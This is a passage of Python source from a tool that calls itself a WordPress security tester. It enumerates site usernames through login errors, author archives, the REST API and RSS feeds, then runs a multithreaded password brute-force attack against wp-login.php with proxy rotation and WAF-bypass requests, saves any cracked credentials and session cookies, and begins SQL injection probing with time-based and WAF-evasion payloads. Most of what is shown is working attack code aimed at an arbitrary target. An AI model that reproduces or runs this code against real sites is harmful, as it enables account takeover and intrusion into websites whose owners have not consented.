                f.write(f"WordPress Detected: {'Yes' if self.results['wordpress_info']['detected'] else 'No'}\n")
                f.write(f"Version: {self.results['wordpress_info']['version'] or 'Unknown'}\n")
                f.write(f"Valid Usernames Found: {len(self.valid_usernames)}\n")
                
                if self.valid_usernames:
                    f.write("\nValid Usernames:\n")
                    for i, username in enumerate(self.valid_usernames, 1):
                        f.write(f"{i}. {username}\n")
                
                f.write("\n" + "=" * 50 + "\n")
                f.write("Generated by WordPress Security Tester v5.1\n")
            
            self.print_result("SUCCESS", f"WordPress information saved to: {info_file}")
            
        except Exception as e:
            self.print_result("WARNING", f"Error saving WordPress info: {str(e)}")
    
    def test_login_page_security(self):
        """Advanced login page security testing with payload verification"""
        self.print_test_header("Login Page Security", "Advanced testing of wp-login.php security")
        
        login_url = self.base_url + self.wp_paths['login']
        
        # Test if login page exists with multiple attempts
        response = self.advanced_request(login_url, bypass_waf=True, retry_count=3)
        
        if not response:
            self.print_payload_result("Login Page", login_url, "FAILED", 
                                    "Login page not accessible after multiple attempts")
            return False
        
        if response.status_code == 200:
            self.print_payload_result("Login Page", login_url, "WORKING", 
                                    "Login page accessible")
            
            # Extract form details
            soup = BeautifulSoup(response.text, 'html.parser')
            form = soup.find('form', {'id': 'loginform'})
            
            if form:
                self.print_result("INFO", "Login form found with ID 'loginform'", login_url)
                
                # Check form fields
                fields = {}
                for input_tag in form.find_all('input'):
                    if input_tag.get('name'):
                        fields[input_tag.get('name')] = input_tag.get('type', 'text')
                
                required_fields = ['log', 'pwd', 'wp-submit']
                missing_fields = [field for field in required_fields if field not in fields]
                
                if missing_fields:
                    self.print_payload_result("Form Fields", str(missing_fields), "WARNING", 
                                            "Missing required login fields")
                else:
                    self.print_payload_result("Form Fields", "All present", "SUCCESS", 
                                            f"Fields: {', '.join(fields.keys())}")
            
            # Check for security features
            security_checks = [
                ('rememberme', 'Remember me checkbox', 'feature'),
                ('lostpassword', 'Lost password link', 'feature'),
                ('wp-submit', 'Login submit button', 'required'),
                ('redirect_to', 'Redirect parameter', 'feature'),
                ('testcookie', 'Test cookie check', 'security'),
                ('_wpnonce', 'WordPress nonce', 'security'),
                ('wp_nonce', 'WordPress nonce (alt)', 'security'),
            ]
            
            for element, description, check_type in security_checks:
                if element in response.text:
                    if check_type == 'security':
                        self.print_payload_result("Security Feature", description, "SUCCESS", 
                                                "Security feature implemented")
                    else:
                        self.print_payload_result("Login Feature", description, "INFO", 
                                                "Feature found")
                else:
                    if check_type == 'security':
                        self.print_payload_result("Security Feature", description, "WARNING", 
                                                "Security feature missing")
            
            # Check for error message patterns (for username enumeration)
            error_patterns = [
                (r'class="(login_error|message)"', 'Error message container'),
                (r'ERROR:', 'Error text'),
                (r'Invalid username', 'Invalid username error'),
                (r'The password you entered', 'Wrong password error'),
                (r'Lost your password', 'Lost password link'),
                (r'Please try again', 'Generic error'),
            ]
            
            for pattern, description in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    self.print_payload_result("Error Pattern", description, "INFO", 
                                            "Error pattern detected")
            
            # Advanced brute force protection detection
            protection_indicators = [
                ('too many times', 'Rate limiting message'),
                ('locked', 'Account lock message'),
                ('try again', 'Retry message'),
                ('security', 'Security plugin message'),
                ('blocked', 'Blocked message'),
                ('captcha', 'CAPTCHA protection'),
                ('recaptcha', 'reCAPTCHA protection'),
                ('2fa', 'Two-factor authentication'),
                ('two-factor', 'Two-factor authentication'),
            ]
            
            protection_found = False
            for indicator, description in protection_indicators:
                if indicator in response.text.lower():
                    self.print_payload_result("Brute Force Protection", description, "SUCCESS", 
                                            "Protection mechanism detected")
                    protection_found = True
                    self.results["brute_force_results"]["rate_limiting"] = True
            
            if not protection_found:
                self.print_payload_result("Brute Force Protection", "None", "CRITICAL", 
                                        "No brute force protection detected - VULNERABLE")
                self.add_critical_issue("No brute force protection detected on login page", login_url)
            
            # Check for WordPress security plugins
            security_plugins = [
                ('wordfence', 'Wordfence Security'),
                ('sucuri', 'Sucuri Security'),
                ('ithemes', 'iThemes Security'),
                ('all-in-one-wp-security', 'All In One WP Security'),
                ('bulletproof-security', 'BulletProof Security'),
                ('wp-security-audit-log', 'WP Security Audit Log'),
                ('security-ninja', 'Security Ninja'),
            ]
            
            for plugin_id, plugin_name in security_plugins:
                if plugin_id in response.text.lower():
                    self.print_payload_result("Security Plugin", plugin_name, "INFO", 
                                            "Security plugin detected")
            
            return True
        else:
            self.print_payload_result("Login Page", login_url, "FAILED", 
                                    f"HTTP Status: {response.status_code}")
            return False
    
    def username_enumeration_test(self):
        """Advanced username enumeration testing with payload verification"""
        self.print_test_header("Username Enumeration", "Testing for username discovery vulnerabilities")
        
        login_url = self.base_url + self.wp_paths['login']
        
        # Method 1: Check if login page reveals valid usernames
        self.print_result("INFO", "Testing username enumeration via error messages")
        
        # Test with invalid username
        test_usernames = [
            'nonexistentuser' + str(random.randint(10000, 99999)),
            'invaliduser' + str(random.randint(10000, 99999)),
            'testuser' + str(random.randint(10000, 99999))
        ]
        
        valid_username_patterns = []
        
        for test_user in test_usernames:
            test_data = {
                'log': test_user,
                'pwd': 'wrongpassword' + str(random.randint(10000, 99999)),
                'wp-submit': 'Log In',
                'redirect_to': self.base_url + self.wp_paths['admin']
            }
            
            response = self.advanced_request(login_url, method="POST", data=test_data, 
                                           bypass_waf=True, allow_redirects=False)
            
            if response:
                response_text = response.text.lower()
                
                # Check for specific error messages
                if 'invalid username' in response_text:
                    self.print_payload_result("Username Enumeration", "Invalid username error", "VULNERABLE", 
                                            "Username enumeration vulnerability detected")
                    self.add_critical_issue("Username enumeration via error messages", login_url)
                    valid_username_patterns.append('invalid_username_error')
                    break
                
                if 'unknown email address' in response_text:
                    self.print_payload_result("Username Enumeration", "Unknown email error", "VULNERABLE", 
                                            "Email enumeration vulnerability detected")
                    self.add_critical_issue("Email enumeration via error messages", login_url)
                    valid_username_patterns.append('unknown_email_error')
                    break
        
        # Method 2: Author archive enumeration
        self.print_result("INFO", "Testing username enumeration via author archives")
        
        discovered_usernames = []
        for i in range(1, 11):  # Check first 10 author IDs
            author_url = f"{self.base_url}/?author={i}"
            response = self.advanced_request(author_url, allow_redirects=False, bypass_waf=True)
            
            if response and response.status_code == 301:
                location = response.headers.get('Location', '')
                if location and ('author' in location or 'user' in location):
                    # Extract username from URL
                    username = self.extract_username_from_url(location)
                    if username and username not in discovered_usernames:
                        discovered_usernames.append(username)
                        self.print_payload_result("Author Enumeration", f"ID {i}", "VULNERABLE", 
                                                f"Username discovered: {username}")
                        self.add_critical_issue(f"User enumeration via author parameter: ID {i}", author_url)
            elif response and response.status_code == 200:
                # Try to extract username from page content
                soup = BeautifulSoup(response.text, 'html.parser')
                author_name = soup.find('h1', class_='author-name') or soup.find('title')
                if author_name:
                    username = author_name.text.strip()
                    if username and username not in discovered_usernames:
                        discovered_usernames.append(username)
                        self.print_payload_result("Author Enumeration", f"ID {i}", "VULNERABLE", 
                                                f"Username found: {username}")
        
        # Method 3: REST API user enumeration
        self.print_result("INFO", "Testing username enumeration via REST API")
        
        api_url = self.base_url + '/wp-json/wp/v2/users'
        response = self.advanced_request(api_url, bypass_waf=True)
        
        if response and response.status_code == 200:
            try:
                users = response.json()
                if isinstance(users, list):
                    api_usernames = []
                    for user in users[:10]:  # Limit to first 10
                        if 'slug' in user:
                            api_usernames.append(user['slug'])
                        elif 'name' in user:
                            api_usernames.append(user['name'])
                    
                    if api_usernames:
                        self.print_payload_result("REST API Enumeration", f"{len(api_usernames)} users", "VULNERABLE", 
                                                f"Usernames: {', '.join(api_usernames[:3])}")
                        self.add_critical_issue(f"User enumeration via REST API ({len(api_usernames)} users)", api_url)
                        discovered_usernames.extend(api_usernames)
                else:
                    self.print_payload_result("REST API Enumeration", "Invalid response", "FAILED", 
                                            "API returned non-list response")
            except json.JSONDecodeError:
                self.print_payload_result("REST API Enumeration", "JSON parse error", "FAILED", 
                                        "Could not parse API response")
            except Exception as e:
                self.print_payload_result("REST API Enumeration", "Error", "FAILED", 
                                        f"Exception: {str(e)[:50]}")
        elif response and response.status_code == 403:
            self.print_payload_result("REST API Enumeration", "Access forbidden", "PROTECTED", 
                                    "REST API user endpoint protected")
        elif response and response.status_code == 404:
            self.print_payload_result("REST API Enumeration", "Not found", "FAILED", 
                                    "REST API endpoint not found")
        
        # Method 4: RSS feed enumeration
        self.print_result("INFO", "Testing username enumeration via RSS feeds")
        
        rss_urls = [
            (f"{self.base_url}/feed/", "Main feed"),
            (f"{self.base_url}/comments/feed/", "Comments feed"),
            (f"{self.base_url}/feed/rss/", "RSS feed"),
            (f"{self.base_url}/atom/", "Atom feed"),
        ]
        
        for rss_url, feed_type in rss_urls:
            response = self.advanced_request(rss_url, bypass_waf=True)
            if response and response.status_code == 200:
                # Look for author information
                author_patterns = [
                    r'<dc:creator>(.*?)</dc:creator>',
                    r'<author>(.*?)</author>',
                    r'<wp:author>(.*?)</wp:author>',
                    r'Posted by (.*?) on',
                ]
                
                for pattern in author_patterns:
                    matches = re.findall(pattern, response.text)
                    for match in matches:
                        if match and match not in discovered_usernames:
                            discovered_usernames.append(match)
                            self.print_payload_result(f"RSS Feed ({feed_type})", match, "VULNERABLE", 
                                                    "User information exposed in RSS feed")
                            self.add_critical_issue(f"User information in {feed_type}", rss_url)
            elif response and response.status_code == 404:
                self.print_payload_result(f"RSS Feed ({feed_type})", "Not found", "INFO", 
                                        "Feed endpoint not found")
        
        # Update results
        if discovered_usernames:
            self.valid_usernames = list(set(discovered_usernames))
            self.results["wordpress_info"]["users"] = self.valid_usernames
            self.results["brute_force_results"]["valid_usernames_found"] = self.valid_usernames
            
            self.print_payload_result("Username Enumeration Summary", f"{len(self.valid_usernames)} found", "CRITICAL", 
                                    f"Total usernames discovered via enumeration")
            
            # Save discovered usernames to file
            self.save_discovered_usernames()
        else:
            self.print_payload_result("Username Enumeration", "No vulnerabilities", "SUCCESS", 
                                    "No username enumeration vulnerabilities detected")
    
    def extract_username_from_url(self, url):
        """Extract username from WordPress URL"""
        patterns = [
            r'/author/([^/]+)/',
            r'/user/([^/]+)/',
            r'/users/([^/]+)/',
            r'/author=([^/&]+)',
            r'/user=([^/&]+)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    def save_discovered_usernames(self):
        """Save discovered usernames to file"""
        if not self.valid_usernames:
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        username_file = os.path.join(self.found_dir, f"discovered_usernames_{timestamp}.txt")
        
        try:
            with open(username_file, 'w', encoding='utf-8') as f:
                f.write(f"Discovered Usernames\n")
                f.write(f"Target: {self.base_url}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Enumeration Methods: Author, REST API, RSS Feeds, Error Messages\n")
                f.write("=" * 50 + "\n\n")
                
                for i, username in enumerate(self.valid_usernames, 1):
                    f.write(f"{i}. {username}\n")
                
                f.write(f"\nTotal: {len(self.valid_usernames)} usernames discovered\n")
            
            self.print_result("SUCCESS", f"Discovered usernames saved: {username_file}")
            
        except Exception as e:
            self.print_result("WARNING", f"Error saving usernames: {str(e)}")
    
    def advanced_brute_force_attack(self, mode="both", specific_username=None, 
                                   specific_password=None, max_workers=5, 
                                   max_attempts=None, stop_on_success=True):
        """
        Advanced brute force attack optimized for Termux
        
        Args:
            mode (str): "both", "username_only", "password_only", "single"
            specific_username (str): Specific username for password_only mode
            specific_password (str): Specific password for username_only mode
            max_workers (int): Number of concurrent threads (reduced for Termux)
            max_attempts (int): Maximum number of attempts
            stop_on_success (bool): Stop after first successful login
        """
        self.print_test_header("Advanced Brute Force", 
                             "Intelligent brute force attack with username enumeration")
        
        # First, try to enumerate usernames if not already done
        if not self.valid_usernames and mode != "single":
            self.print_result("INFO", "Attempting username enumeration before brute force")
            self.username_enumeration_test()
        
        login_url = self.base_url + self.wp_paths['login']
        
        # Verify login page is accessible
        if not self.test_login_page_security():
            self.print_result("FAILED", "Cannot proceed with brute force - login page not accessible")
            return []
        
        # Load wordlists if not loaded
        if not self.username_list or not self.password_list:
            self.load_wordlists()
        
        # Generate test combinations based on mode
        test_combinations = []
        
        if mode == "both":
            # Use discovered usernames if available, otherwise use wordlist
            usernames_to_test = self.valid_usernames if self.valid_usernames else self.username_list
            
            if not usernames_to_test:
                self.print_result("WARNING", "No usernames to test. Using default wordlist.")
                self.load_wordlists()
                usernames_to_test = self.username_list
            
            self.print_payload_result("Brute Force Mode", "Username List + Password List", "WORKING", 
                                    f"Testing {len(usernames_to_test)} usernames × {len(self.password_list)} passwords")
            
            for username in usernames_to_test:
                for password in self.password_list:
                    test_combinations.append((username, password, "both"))
            
        elif mode == "username_only" and specific_password:
            # لیست یوزرنیم + پسورد مشخص
            usernames_to_test = self.valid_usernames if self.valid_usernames else self.username_list
            
            self.print_payload_result("Brute Force Mode", "Username List + Specific Password", "WORKING", 
                                    f"Testing {len(usernames_to_test)} usernames with password: {specific_password}")
            
            for username in usernames_to_test:
                test_combinations.append((username, specific_password, "username_only"))
            
        elif mode == "password_only" and specific_username:
            # یوزرنیم مشخص + لیست پسورد
            self.print_payload_result("Brute Force Mode", "Specific Username + Password List", "WORKING", 
                                    f"Testing username: {specific_username} with {len(self.password_list)} passwords")
            
            for password in self.password_list:
                test_combinations.append((specific_username, password, "password_only"))
            
        elif mode == "single" and specific_username and specific_password:
            # یوزرنیم مشخص + پسورد مشخص
            test_combinations.append((specific_username, specific_password, "single"))
            self.print_payload_result("Brute Force Mode", "Single Credential", "WORKING", 
                                    f"Testing: {specific_username}:{specific_password}")
            
        else:
            self.print_payload_result("Brute Force Mode", "Invalid", "FAILED", 
                                    f"Invalid mode or missing parameters: {mode}")
            print(f"{Fore.YELLOW}Available modes:{Style.RESET_ALL}")
            print(f"  both: Username list + Password list")
            print(f"  username_only: Username list + Specific password")
            print(f"  password_only: Specific username + Password list")
            print(f"  single: Single username + Single password")
            return []
        
        # Limit attempts if specified
        if max_attempts and len(test_combinations) > max_attempts:
            test_combinations = random.sample(test_combinations, max_attempts)
            self.print_result("INFO", f"Limited to {max_attempts} random attempts")
        
        total_tests = len(test_combinations)
        self.print_result("INFO", 
                         f"Total combinations to test: {total_tests:,}",
                         "", 
                         f"Mode: {mode}, Workers: {max_workers}")
        
        if total_tests == 0:
            self.print_result("WARNING", "No test combinations generated")
            return []
        
        # Progress tracking
        found_credentials = []
        valid_usernames_found = []
        tested = 0
        start_time = time.time()
        
        # Display progress bar
        print(f"\n{Fore.CYAN}[*] Starting advanced brute force attack...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Progress:{Style.RESET_ALL}")
        
        # Thread worker function with advanced detection
        def test_worker(username, password, test_mode):
            try:
                # Rotate proxy if available
                if self.proxy_list:
                    self.session.proxies.update(self.rotate_proxy())
                
                # Get login page first to get nonce
                login_page = self.advanced_request(login_url, bypass_waf=True)
                if not login_page:
                    return "error", username, password, "Could not get login page"
                
                # Extract WordPress nonce
                nonce = self.extract_wp_nonce_advanced(login_page.text)
                
                # Extract redirect URL
                redirect_to = self.extract_redirect_url_advanced(login_page.text)
                
                # Prepare login data with all possible fields
                login_data = {
                    'log': username,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': redirect_to,
                    'testcookie': '1'
                }
                
                if nonce:
                    login_data['_wpnonce'] = nonce
                    login_data['wp_nonce'] = nonce
                
                # Add additional fields that might be expected
                login_data.update({
                    'rememberme': 'forever',
                    'action': 'login',
                    'user_login': username,
                    'user_pass': password
                })
                
                # Try login with different techniques
                login_attempts = [
                    {'headers': {'Referer': login_url}},
                    {'headers': {'Referer': self.base_url}},
                    {'headers': {}, 'allow_redirects': True},
                    {'headers': {}, 'allow_redirects': False}
                ]
                
                for attempt in login_attempts:
                    response = self.advanced_request(
                        login_url, 
                        method="POST", 
                        data=login_data, 
                        bypass_waf=True,
                        allow_redirects=attempt.get('allow_redirects', False),
                        headers=attempt.get('headers', {})
                    )
                    
                    if response:
                        # Check for successful login
                        if self.check_login_success_advanced(response, username):
                            cookies = self.session.cookies.get_dict()
                            return "success", username, password, cookies
                        
                        # Check for valid username (wrong password)
                        if self.check_valid_username(response, username):
                            return "valid_user", username, password, None
                
                return "failed", username, password, None
                    
            except Exception as e:
                return "error", username, password, str(e)
        
        # Execute with thread pool (reduced workers for Termux)
        max_workers = min(max_workers, 5)  # Limit workers for Termux
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            future_to_cred = {
                executor.submit(test_worker, user, pwd, mode): (user, pwd, mode) 
                for user, pwd, mode in test_combinations
            }
            
            # Process results as they complete
            for future in as_completed(future_to_cred):
                tested += 1
                username, password, test_mode = future_to_cred[future]
                
                try:
                    result = future.result(timeout=30)
                    result_type = result[0]
                    
                    if result_type == "error":
                        error_msg = result[3]
                        self.print_result("WARNING", 
                                         f"Error testing {username}:{password}",
                                         "", f"Error: {error_msg[:50]}")
                    
                    elif result_type == "success":
                        username, password, cookies = result[1], result[2], result[3]
                        credential = f"{username}:{password}"
                        
                        self.print_payload_result("Brute Force Attack", credential, "VULNERABLE",
                                                 "✅ LOGIN SUCCESSFUL - Valid credentials found!")
                        
                        found_credentials.append({
                            'username': username,
                            'password': password,
                            'cookies': cookies,
                            'timestamp': datetime.now().isoformat(),
                            'url': login_url,
                            'mode': test_mode
                        })
                        
                        self.results["brute_force_results"]["successful_logins"].append(credential)
                        self.add_critical_issue(f"Valid credentials found: {credential}", login_url)
                        
                        if stop_on_success:
                            # Cancel remaining tasks
                            for f in future_to_cred:
                                f.cancel()
                            executor.shutdown(wait=False)
                            break
                    
                    elif result_type == "valid_user":
                        username, password = result[1], result[2]
                        
                        if username not in valid_usernames_found:
                            valid_usernames_found.append(username)
                            self.print_payload_result("Brute Force Attack", username, "WORKING",
                                                     f"⚠️ Valid username found (wrong password: {password})")
                            
                            # Add to valid usernames list
                            if username not in self.valid_usernames:
                                self.valid_usernames.append(username)
                    
                    else:  # Failed login
                        self.results["brute_force_results"]["failed_logins"] += 1
                
                except Exception as e:
                    self.print_result("WARNING", 
                                     f"Exception testing {username}:{password}",
                                     "", f"Exception: {str(e)[:50]}")
                
                # Update progress every 10 attempts
                if tested % 10 == 0 or tested == total_tests:
                    self.update_progress_advanced(tested, total_tests, len(found_credentials), 
                                                 len(valid_usernames_found), start_time)
        
        # Final progress update
        self.update_progress_advanced(tested, total_tests, len(found_credentials), 
                                     len(valid_usernames_found), start_time, final=True)
        
        # Update valid usernames in results
        if valid_usernames_found:
            self.results["wordpress_info"]["valid_usernames"] = list(set(valid_usernames_found))
            self.results["brute_force_results"]["valid_usernames_found"] = list(set(valid_usernames_found))
            
            # Save newly discovered valid usernames
            self.save_discovered_usernames()
        
        # Summary
        elapsed_time = time.time() - start_time
        self.results["brute_force_results"]["attempts"] = tested
        
        if found_credentials:
            self.print_payload_result("Brute Force Summary", f"{len(found_credentials)} found", "CRITICAL",
                                     f"Found {len(found_credentials)} valid credentials in {elapsed_time:.1f}s!")
            
            # Display found credentials
            print(f"\n{Fore.RED}{'='*60}")
            print(f"🔥 CRITICAL FINDINGS - VALID CREDENTIALS")
            print(f"{'='*60}{Style.RESET_ALL}")
            
            for i, cred in enumerate(found_credentials, 1):
                print(f"{Fore.RED}{i}. {Fore.YELLOW}Username: {Fore.WHITE}{cred['username']}")
                print(f"   {Fore.YELLOW}Password: {Fore.WHITE}{cred['password']}")
                print(f"   {Fore.CYAN}URL: {Fore.WHITE}{cred['url']}")
                print(f"   {Fore.CYAN}Time: {Fore.WHITE}{cred['timestamp']}")
                print()
            
            # Save credentials to file
            self.save_found_credentials(found_credentials)
        
        if valid_usernames_found:
            print(f"\n{Fore.YELLOW}{'='*60}")
            print(f"⚠️ VALID USERNAMES FOUND (Wrong Password)")
            print(f"{'='*60}{Style.RESET_ALL}")
            
            for i, username in enumerate(valid_usernames_found[:10], 1):
                print(f"{Fore.YELLOW}{i}. {Fore.WHITE}{username}")
            
            if len(valid_usernames_found) > 10:
                print(f"{Fore.YELLOW}... and {len(valid_usernames_found) - 10} more{Style.RESET_ALL}")
        
        if not found_credentials and not valid_usernames_found:
            self.print_payload_result("Brute Force Summary", "No results", "SUCCESS",
                                     f"No valid credentials found in {elapsed_time:.1f}s")
        
        return found_credentials
    
    def extract_wp_nonce_advanced(self, html):
        """Advanced WordPress nonce extraction"""
        patterns = [
            r'name="_wpnonce" value="([a-f0-9]{10,})"',
            r'name="wp_nonce" value="([a-f0-9]{10,})"',
            r'id="_wpnonce" value="([^"]+)"',
            r'nonce=([a-f0-9]{10,})',
            r'"nonce":"([a-f0-9]{10,})"',
            r'ajax_nonce":"([a-f0-9]{10,})"',
            r'data-nonce="([a-f0-9]{10,})"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                nonce = match.group(1)
                if len(nonce) >= 10:  # Valid nonce length
                    return nonce
        
        # Try to find in hidden fields
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for input_tag in soup.find_all('input', {'type': 'hidden'}):
                if 'nonce' in input_tag.get('name', '').lower() or 'nonce' in input_tag.get('id', '').lower():
                    nonce = input_tag.get('value', '')
                    if nonce and len(nonce) >= 10:
                        return nonce
        except:
            pass
        
        return None
    
    def extract_redirect_url_advanced(self, html):
        """Extract redirect URL from login form with multiple techniques"""
        patterns = [
            r'name="redirect_to" value="([^"]+)"',
            r'redirect_to=([^&\s]+)',
            r'redirect_to%5D=([^&\s]+)',
            r'<input[^>]*name="redirect_to"[^>]*value="([^"]+)"',
            r'redirect_to" value="([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                redirect_url = match.group(1)
                # Ensure it's a full URL
                if not redirect_url.startswith(('http://', 'https://')):
                    # Check if it's relative
                    if redirect_url.startswith('/'):
                        redirect_url = self.base_url + redirect_url
                    else:
                        redirect_url = self.base_url + '/' + redirect_url
                return redirect_url
        
        # Default redirect to admin panel
        return self.base_url + self.wp_paths['admin']
    
    def check_login_success_advanced(self, response, username):
        """Advanced login success detection with payload verification"""
        # Check response status
        if response.status_code in [200, 302, 301]:
            response_text = response.text.lower()
            response_url = response.url.lower()
            
            # Multiple success indicators
            success_indicators = [
                # URL indicators
                'wp-admin' in response_url,
                'dashboard' in response_url,
                'profile.php' in response_url,
                'admin.php' in response_url,
                
                # Content indicators
                'dashboard' in response_text,
                'wp-admin-bar' in response_text,
                'admin-menu' in response_text,
                'screen options' in response_text,
                'howdy' in response_text and username.lower() in response_text,
                'welcome to wordpress' in response_text,
                'logout' in response_text and 'wp-login.php' in response_text,
                
                # Admin features
                'post-new.php' in response_text,
                'edit.php' in response_text,
                'plugins.php' in response_text,
                'users.php' in response_text,
                
                # WordPress specific classes
                'class="wp-admin' in response_text,
                'id="wpadminbar' in response_text,
                'class="admin-bar' in response_text,
            ]
            
            # Check headers
            if 'Location' in response.headers:
                location = response.headers['Location'].lower()
                if 'wp-admin' in location or 'dashboard' in location:
                    return True
            
            # Check cookies
            cookies = response.cookies
            if cookies:
                cookie_names = [cookie.name.lower() for cookie in cookies]
                if any('wordpress_logged_in' in name for name in cookie_names):
                    return True
                if any('wp-settings' in name for name in cookie_names):
                    return True
            
            # Check for any success indicator
            for indicator in success_indicators:
                if indicator:
                    return True
            
            # Check for redirect history
            if hasattr(response, 'history'):
                for resp in response.history:
                    if resp.status_code == 302 and 'wp-admin' in resp.headers.get('Location', ''):
                        return True
        
        return False
    
    def check_valid_username(self, response, username):
        """Check if username is valid (even with wrong password) with payload verification"""
        response_text = response.text.lower()
        
        # Patterns that indicate username exists but password is wrong
        valid_username_indicators = [
            'the password you entered',
            'incorrect password',
            'wrong password',
            'is incorrect',
            'password is incorrect',
            'password you entered for the username',
            'password for the username',
        ]
        
        # Patterns that indicate username doesn't exist
        invalid_username_indicators = [
            'invalid username',
            'unknown username',
            'no user found',
            'username does not exist',
            'user not found',
            'invalid email',
            'unknown email address',
        ]
        
        # Check for valid username patterns
        for indicator in valid_username_indicators:
            if indicator in response_text:
                # Make sure it's not saying username is invalid
                for invalid_indicator in invalid_username_indicators:
                    if invalid_indicator in response_text:
                        return False
                return True
        
        # Special case: "Lost your password?" link often appears for valid users
        if 'lost your password' in response_text and 'invalid' not in response_text:
            # Check if it's offering password reset for this user
            if username.lower() in response_text:
                return True
        
        return False
    
    def update_progress_advanced(self, current, total, found_creds, valid_users, start_time, final=False):
        """Update progress display with advanced information"""
        progress = (current / total) * 100
        elapsed = time.time() - start_time
        speed = current / elapsed if elapsed > 0 else 0
        
        # Calculate estimated time remaining
        if current > 0 and speed > 0:
            remaining = (total - current) / speed
            eta = f"ETA: {remaining:.0f}s"
        else:
            eta = "ETA: Calculating..."
        
        # Progress bar
        bar_length = 40
        filled_length = int(bar_length * current // total)
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        
        if final:
            end_char = "\n"
        else:
            end_char = "\r"
        
        print(f"  {Fore.CYAN}[{bar}] {progress:5.1f}% | "
              f"{Fore.YELLOW}{current:,}/{total:,} | "
              f"{Fore.GREEN}{speed:.1f} req/sec | "
              f"{Fore.RED}✅ Found: {found_creds} | "
              f"{Fore.YELLOW}⚠️ Valid Users: {valid_users} | "
              f"{Fore.CYAN}{eta}{Style.RESET_ALL}", 
              end=end_char, flush=True)
    
    def save_found_credentials(self, credentials):
        """Save found credentials to file with payload verification"""
        if not credentials:
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        creds_file = os.path.join(self.found_dir, f"found_credentials_{timestamp}.txt")
        
        try:
            with open(creds_file, 'w', encoding='utf-8') as f:
                f.write(f"WordPress Credentials Found\n")
                f.write(f"Target: {self.base_url}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Found: {len(credentials)}\n")
                f.write(f"Tool: WordPress Security Tester v5.1 - Termux Edition\n")
                f.write("=" * 60 + "\n\n")
                
                for i, cred in enumerate(credentials, 1):
                    f.write(f"[{i}] Username: {cred['username']}\n")
                    f.write(f"    Password: {cred['password']}\n")
                    f.write(f"    Found at: {cred['timestamp']}\n")
                    f.write(f"    Login URL: {cred['url']}\n")
                    if cred.get('cookies'):
                        f.write(f"    Cookies: {len(cred['cookies'])} cookies found\n")
                    f.write(f"    Mode: {cred.get('mode', 'unknown')}\n")
                    f.write(f"-" * 40 + "\n")
                
                f.write(f"\n⚠️ SECURITY WARNING:\n")
                f.write(f"1. Change these passwords immediately\n")
                f.write(f"2. Enable Two-Factor Authentication (2FA)\n")
                f.write(f"3. Review user access permissions\n")
                f.write(f"4. Implement login attempt limiting\n")
            
            self.print_payload_result("Credentials Saved", f"{len(credentials)} found", "SUCCESS",
                                     f"Credentials saved to: {creds_file}")
            
        except Exception as e:
            self.print_payload_result("Save Error", "File write failed", "FAILED",
                                     f"Error: {str(e)}")
    
    def advanced_sql_injection_test(self):
        """Advanced SQL Injection testing with multiple bypass techniques and payload verification"""
        self.print_test_header("Advanced SQL Injection", "Testing with multiple bypass techniques and WAF evasion")
        
        # Load SQLi payloads
        sqli_payloads = self.load_sqli_payloads()
        
        # Test endpoints
        test_endpoints = [
            (self.base_url + '/', 'Home page'),
            (self.base_url + '/index.php', 'Index page'),
            (self.base_url + '/?p=1', 'Post parameter'),
            (self.base_url + '/?page_id=1', 'Page ID parameter'),
            (self.base_url + '/wp-content/themes/twentytwentyone/index.php', 'Theme index'),
        ]
        
        # Test parameters
        test_params = ['id', 'post', 'page', 'cat', 'category', 'user', 'author', 
                      's', 'search', 'q', 'query', 'tag', 'taxonomy']
        
        vulnerabilities_found = 0
        tested_payloads = 0
        
        for endpoint, endpoint_desc in test_endpoints:
            for param in test_params:
                self.print_result("INFO", f"Testing parameter: {param} on {endpoint_desc}")
                
                # Test different payload categories
                payload_categories = [
                    ('Error Based', sqli_payloads['error_based'][:5]),
                    ('Union Based', sqli_payloads['union_based'][:5]),
                    ('Time Based', sqli_payloads['time_based'][:3]),
                    ('Boolean Based', sqli_payloads['boolean_based'][:3]),
                    ('WAF Bypass', sqli_payloads['waf_bypass'][:5]),
                ]
                
                for category_name, payloads in payload_categories:
                    for payload in payloads:
                        tested_payloads += 1
                        test_url = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                        
                        # Time-based detection
                        if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                            start_time = time.time()
                            response = self.advanced_request(test_url, timeout=15, bypass_waf=True)  # Longer timeout for sleep
                            response_time = time.time() - start_time
                            
                            if response:
                                if response_time > 8:  # Increased threshold for mobile networks
                                    self.print_payload_result("SQLi (Time-based)", payload, "VULNERABLE",
                                                            f"Parameter '{param}' | Response time: {response_time:.2f}s")
                                    self.add_critical_issue(f"SQLi (Time-based) in parameter '{param}'", test_url)
                                    vulnerabilities_found += 1
                                    break
                                else:
                                    self.print_payload_result("SQLi (Time-based)", payload, "PROTECTED",
                                                            f"Parameter '{param}' | Response time: {response_time:.2f}s")
                        
                        # Error/Union/Boolean based detection
                        else:
                            response = self.advanced_request(test_url, timeout=8, bypass_waf=True)  # Increased timeout
                            
                            if response and response.status_code == 200:
                                # Check for error messages
                                error_indicators = [
                                    'SQL syntax', 'MySQL', 'Database', 'Query failed',
                                    'Syntax error', 'mysql_fetch', 'mysqli_fetch',
                                    'pg_fetch', 'ORA-', 'Microsoft OLE DB',
                                    'ODBC Driver', 'PostgreSQL', 'SQLite',
                                    'You have an error in your SQL syntax',
                                    'Warning: mysqli', 'Unclosed quotation mark',
                                    'Division by zero', 'Invalid parameter',
                                ]
                                
                                for error in error_indicators:
                                    if error in response.text:
